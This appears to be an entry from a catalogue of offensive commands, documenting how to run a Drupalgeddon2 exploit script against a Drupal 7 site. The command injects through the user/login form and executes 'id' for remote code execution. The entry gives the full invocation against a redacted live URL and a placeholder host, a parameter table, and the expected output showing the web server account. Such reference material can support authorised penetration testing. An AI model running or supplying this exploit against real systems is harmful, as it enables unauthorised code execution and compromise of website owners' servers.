---
id: cmd-003
data: >-
  ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id
  --form user/login
tags:
  - rce
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.676Z'
verified: false
validated: true
submitted: true
---
# ruby-drupalgeddon2-id

## Command

```bash
ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login
```

## Description

Executes the Drupalgeddon2 exploit to run the 'id' command on the target, demonstrating RCE via form injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| -v | Drupal version (7) | Yes |
| -c | Command to execute (id) | Yes |
| --form | Target form (user/login) | Yes |

## Examples

### Basic Usage

```bash
ruby drupalgeddon2-customizable-beta.rb -u https://target.com/ -v 7 -c id --form user/login
```

### Advanced Usage

Not applicable; specific to this exploit.

## Expected Output

Request details and 'uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0'.

## Related

- [[Related Procedure: Execute-RCE-with-ID-Command]]
